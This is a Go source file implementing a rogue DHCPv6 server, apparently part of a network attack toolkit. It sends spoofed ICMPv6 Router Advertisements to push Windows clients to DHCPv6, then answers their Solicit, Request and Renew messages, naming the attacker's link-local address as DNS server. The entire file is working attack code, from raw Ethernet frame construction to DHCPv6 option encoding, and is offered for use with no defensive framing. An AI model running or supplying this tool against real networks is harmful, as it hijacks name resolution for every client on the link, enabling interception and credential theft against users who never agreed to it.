// Package dhcpv6 implements a rogue DHCPv6 server that spoofs IPv6 addresses
// and DNS servers.
//
// Attack flow:
//  1. ICMPv6 Router Advertisement (M=1, O=1) is broadcast every 30 s on
//     ff02::1.  Windows clients interpret M=1 as "use DHCPv6 for addresses"
//     and O=1 as "use DHCPv6 for other config (DNS)".
//  2. Client sends DHCPv6 Solicit → we reply with Advertise, advertising our
//     link-local address as the DNS server.
//  3. Client sends DHCPv6 Request (or Renew) directed to our DUID → we reply
//     with Reply, confirming the lease and DNS server assignment.
//
// Socket: AF_PACKET/SOCK_RAW/ETH_P_IPV6 — no pcap, full Ethernet frame control
// so we can send directly to the client's MAC before they have a neighbour entry.
package dhcpv6

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync"
	"time"
)

const dhcpv6Tag = "\x1b[95m[DHCPv6]\x1b[0m" // light purple

// rawSocket is satisfied by the platform-specific AF_PACKET implementation.
type rawSocket interface {
	Send(pkt []byte) error
	Recv(buf []byte) (int, error)
	Close() error
}

// Spoofer runs the rogue DHCPv6 server on the given interface.
type Spoofer struct {
	Interface string
}

// Run starts the RA broadcaster and the DHCPv6 packet loop.
func (s *Spoofer) Run() error {
	iface, err := net.InterfaceByName(s.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", s.Interface, err)
	}

	selfIP, err := ifaceIPv6LL(iface)
	if err != nil {
		return fmt.Errorf("IPv6 link-local on %s: %w (ensure IPv6 is up: sysctl -w net.ipv6.conf.%s.disable_ipv6=0)", s.Interface, err, s.Interface)
	}
	selfMAC := iface.HardwareAddr
	serverDUID := buildDUIDLL(selfMAC)

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", dhcpv6Tag)
		os.Exit(0)
	}()

	fmt.Printf("%s DHCPv6 spoofing on %s | our addr: %s\n", dhcpv6Tag, s.Interface, selfIP)
	fmt.Printf("%s Sending ICMPv6 RA (M=1, O=1) every 30 s. Ctrl+C to stop.\n", dhcpv6Tag)

	// RA goroutine
	go func() {
		for {
			if err := sock.Send(buildRA(selfMAC, selfIP)); err != nil {
				fmt.Printf("%s RA send: %v\n", dhcpv6Tag, err)
			} else {
				fmt.Printf("%s Sent RA → ff02::1 (M=1, O=1, routerlifetime=0)\n", dhcpv6Tag)
			}
			time.Sleep(30 * time.Second)
		}
	}()

	// Per-client assigned address tracking (MAC → IPv6).
	var (
		mu      sync.Mutex
		clients = make(map[string]net.IP)
		counter uint32
	)
	assignAddr := func(macKey string) net.IP {
		mu.Lock()
		defer mu.Unlock()
		if addr, ok := clients[macKey]; ok {
			return addr
		}
		counter++
		n := counter
		addr := make(net.IP, 16)
		addr[0] = 0xfe; addr[1] = 0x80
		// bytes [2:8] = 0 (link-local prefix)
		addr[8] = 0xde; addr[9] = 0xad
		addr[10] = 0xbe; addr[11] = 0xef
		binary.BigEndian.PutUint32(addr[12:16], n)
		clients[macKey] = addr
		return addr
	}

	buf := make([]byte, 65536)
	for {
		n, err := sock.Recv(buf)
		if err != nil {
			return fmt.Errorf("recv: %w", err)
		}

		// Minimum: 14 (eth) + 40 (ipv6) + 8 (udp) + 4 (dhcpv6) = 66
		if n < 66 {
			continue
		}
		pkt := buf[:n]

		if pkt[12] != 0x86 || pkt[13] != 0xDD { // IPv6 EtherType
			continue
		}
		if pkt[20] != 17 { // next header = UDP (no extension headers assumed)
			continue
		}
		if pkt[56] != 0x02 || pkt[57] != 0x23 { // UDP dport 547 (DHCPv6 server)
			continue
		}

		clientMAC := net.HardwareAddr(cloneBytes(pkt[6:12]))
		clientIP := net.IP(cloneBytes(pkt[22:38]))

		msg, err := parseDHCP6(pkt[62:]) // DHCPv6 starts after eth(14)+ipv6(40)+udp(8)
		if err != nil || msg.opts[1] == nil {
			continue // require OPTION_CLIENTID
		}
		iaid, ok := parseIANA(msg.opts[3]) // OPTION_IA_NA
		if !ok {
			continue
		}

		macKey := clientMAC.String()
		assigned := assignAddr(macKey)

		switch msg.msgType {
		case 1: // SOLICIT → ADVERTISE
			payload := buildDHCPv6Msg(2, msg.trid, msg.opts[1], serverDUID, iaid, assigned, selfIP)
			frame := buildDHCPv6Frame(selfMAC, clientMAC, selfIP, clientIP, payload)
			if err := sock.Send(frame); err == nil {
				fmt.Printf("%s Advertise → %s (%s)  dns=%s\n", dhcpv6Tag, clientIP, macKey, selfIP)
			}

		case 3: // REQUEST → REPLY
			if !bytes.Equal(msg.opts[2], serverDUID) {
				continue
			}
			payload := buildDHCPv6Msg(7, msg.trid, msg.opts[1], serverDUID, iaid, assigned, selfIP)
			frame := buildDHCPv6Frame(selfMAC, clientMAC, selfIP, clientIP, payload)
			if err := sock.Send(frame); err == nil {
				fmt.Printf("%s Reply(Request) → %s (%s)  addr=%s dns=%s\n", dhcpv6Tag, clientIP, macKey, assigned, selfIP)
			}

		case 5: // RENEW → REPLY
			if !bytes.Equal(msg.opts[2], serverDUID) {
				continue
			}
			payload := buildDHCPv6Msg(7, msg.trid, msg.opts[1], serverDUID, iaid, assigned, selfIP)
			frame := buildDHCPv6Frame(selfMAC, clientMAC, selfIP, clientIP, payload)
			if err := sock.Send(frame); err == nil {
				fmt.Printf("%s Reply(Renew) → %s (%s)  dns=%s\n", dhcpv6Tag, clientIP, macKey, selfIP)
			}
		}
	}
}

// buildDUIDLL builds a DUID-LL (type 3, hardware-type 1 = Ethernet).
func buildDUIDLL(mac net.HardwareAddr) []byte {
	d := make([]byte, 10)
	binary.BigEndian.PutUint16(d[0:2], 3) // DUID-LL
	binary.BigEndian.PutUint16(d[2:4], 1) // Ethernet
	copy(d[4:], mac)
	return d
}

// buildRA constructs an ICMPv6 Router Advertisement with M=1 O=1 routerlifetime=0,
// Ether dst 33:33:00:00:00:01 / IPv6 dst ff02::1.
func buildRA(srcMAC net.HardwareAddr, srcIP net.IP) []byte {
	dstMAC := net.HardwareAddr{0x33, 0x33, 0x00, 0x00, 0x00, 0x01}
	dstIP := net.IP{0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x01} // ff02::1

	icmp := make([]byte, 16)
	icmp[0] = 134  // type: Router Advertisement
	icmp[1] = 0    // code
	icmp[5] = 0xC0 // M=1 (bit7), O=1 (bit6) → 0b11000000
	// router lifetime [6:8] = 0, reachable time [8:12] = 0, retrans timer [12:16] = 0
	cksum := ipv6L4Checksum(srcIP.To16(), dstIP, 58, icmp) // next header 58 = ICMPv6
	binary.BigEndian.PutUint16(icmp[2:4], cksum)

	return buildIPv6Frame(srcMAC, dstMAC, srcIP, dstIP, 58, 255, icmp)
}

// buildDHCPv6Msg constructs a DHCPv6 Advertise (type 2) or Reply (type 7) payload.
//
// Options included:
//
//	1 (CLIENTID)    — echo client's DUID back
//	2 (SERVERID)    — our DUID-LL
//	3 (IA_NA)       — assigned address with preferred/valid lifetime 300 s
//	23 (DNS_SERVERS) — our IPv6 link-local address as DNS resolver
func buildDHCPv6Msg(msgType byte, trid [3]byte, clientDUID, serverDUID []byte, iaid [4]byte, assigned, dnsAddr net.IP) []byte {
	var b bytes.Buffer
	b.WriteByte(msgType)
	b.Write(trid[:])
	writeOpt(&b, 1, clientDUID)        // OPTION_CLIENTID
	writeOpt(&b, 2, serverDUID)        // OPTION_SERVERID
	b.Write(encodeIANA(iaid, assigned)) // OPTION_IA_NA + embedded OPTION_IAADDR
	writeOpt(&b, 23, dnsAddr.To16())   // OPTION_DNS_SERVERS
	return b.Bytes()
}

// encodeIANA encodes OPTION_IA_NA (type 3) with an embedded OPTION_IAADDR (type 5).
// T1=200 s, T2=250 s, preferred=300 s, valid=300 s.
func encodeIANA(iaid [4]byte, addr net.IP) []byte {
	// OPTION_IAADDR (type 5): addr(16) + preferred-lifetime(4) + valid-lifetime(4)
	iaaddr := make([]byte, 4+24)
	binary.BigEndian.PutUint16(iaaddr[0:2], 5)  // code
	binary.BigEndian.PutUint16(iaaddr[2:4], 24) // length (16+4+4)
	copy(iaaddr[4:20], addr.To16())
	binary.BigEndian.PutUint32(iaaddr[20:24], 300) // preferred lifetime
	binary.BigEndian.PutUint32(iaaddr[24:28], 300) // valid lifetime

	// OPTION_IA_NA (type 3): IAID(4) + T1(4) + T2(4) + suboptions
	naLen := 12 + len(iaaddr)
	iana := make([]byte, 4+naLen)
	binary.BigEndian.PutUint16(iana[0:2], 3) // code
	binary.BigEndian.PutUint16(iana[2:4], uint16(naLen))
	copy(iana[4:8], iaid[:])
	binary.BigEndian.PutUint32(iana[8:12], 200)  // T1
	binary.BigEndian.PutUint32(iana[12:16], 250) // T2
	copy(iana[16:], iaaddr)
	return iana
}

// writeOpt writes a DHCPv6 option TLV.
func writeOpt(w *bytes.Buffer, code uint16, data []byte) {
	var h [4]byte
	binary.BigEndian.PutUint16(h[0:2], code)
	binary.BigEndian.PutUint16(h[2:4], uint16(len(data)))
	w.Write(h[:])
	w.Write(data)
}

// buildDHCPv6Frame wraps a DHCPv6 payload in UDP (sport=547, dport=546) +
// IPv6 + Ethernet, computing the IPv6 pseudo-header UDP checksum.
func buildDHCPv6Frame(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, dhcpPayload []byte) []byte {
	udpLen := 8 + len(dhcpPayload)
	udp := make([]byte, udpLen)
	binary.BigEndian.PutUint16(udp[0:2], 547) // sport: server
	binary.BigEndian.PutUint16(udp[2:4], 546) // dport: client
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
	copy(udp[8:], dhcpPayload)
	cksum := ipv6L4Checksum(srcIP.To16(), dstIP.To16(), 17, udp) // 17 = UDP
	binary.BigEndian.PutUint16(udp[6:8], cksum)
	return buildIPv6Frame(srcMAC, dstMAC, srcIP, dstIP, 17, 64, udp)
}

// buildIPv6Frame wraps a payload in an IPv6 + Ethernet frame.
func buildIPv6Frame(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, nextHdr, hopLimit byte, payload []byte) []byte {
	ipv6 := make([]byte, 40)
	ipv6[0] = 0x60 // version = 6
	binary.BigEndian.PutUint16(ipv6[4:6], uint16(len(payload)))
	ipv6[6] = nextHdr
	ipv6[7] = hopLimit
	copy(ipv6[8:24], srcIP.To16())
	copy(ipv6[24:40], dstIP.To16())

	frame := make([]byte, 14+40+len(payload))
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], srcMAC)
	frame[12] = 0x86; frame[13] = 0xDD // EtherType IPv6
	copy(frame[14:54], ipv6)
	copy(frame[54:], payload)
	return frame
}

// ipv6L4Checksum computes the IPv6 pseudo-header one's complement checksum
// for UDP (nextHdr=17) and ICMPv6 (nextHdr=58).
func ipv6L4Checksum(srcIP, dstIP net.IP, nextHdr byte, payload []byte) uint16 {
	pseudo := make([]byte, 40+len(payload))
	copy(pseudo[0:16], srcIP.To16())
	copy(pseudo[16:32], dstIP.To16())
	binary.BigEndian.PutUint32(pseudo[32:36], uint32(len(payload)))
	// pseudo[36:39] = 0
	pseudo[39] = nextHdr
	copy(pseudo[40:], payload)
	return onesCompSum(pseudo)
}

// onesCompSum computes the RFC 791 one's complement checksum.
func onesCompSum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

type dhcp6Msg struct {
	msgType byte
	trid    [3]byte
	opts    map[uint16][]byte
}

func parseDHCP6(data []byte) (*dhcp6Msg, error) {
	if len(data) < 4 {
		return nil, fmt.Errorf("too short")
	}
	msg := &dhcp6Msg{
		msgType: data[0],
		opts:    make(map[uint16][]byte),
	}
	copy(msg.trid[:], data[1:4])
	for i := 4; i+4 <= len(data); {
		code := binary.BigEndian.Uint16(data[i : i+2])
		l := int(binary.BigEndian.Uint16(data[i+2 : i+4]))
		i += 4
		if i+l > len(data) {
			break
		}
		msg.opts[code] = data[i : i+l]
		i += l
	}
	return msg, nil
}

// parseIANA extracts the IAID from the first 4 bytes of an IA_NA option value.
func parseIANA(opt []byte) ([4]byte, bool) {
	if len(opt) < 4 {
		return [4]byte{}, false
	}
	var iaid [4]byte
	copy(iaid[:], opt[0:4])
	return iaid, true
}

func ifaceIPv6LL(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if ip := ipNet.IP; ip.To4() == nil && ip.IsLinkLocalUnicast() {
				return ip, nil
			}
		}
	}
	return nil, fmt.Errorf("no IPv6 link-local address on %s", iface.Name)
}

func cloneBytes(b []byte) []byte {
	c := make([]byte, len(b))
	copy(c, b)
	return c
}
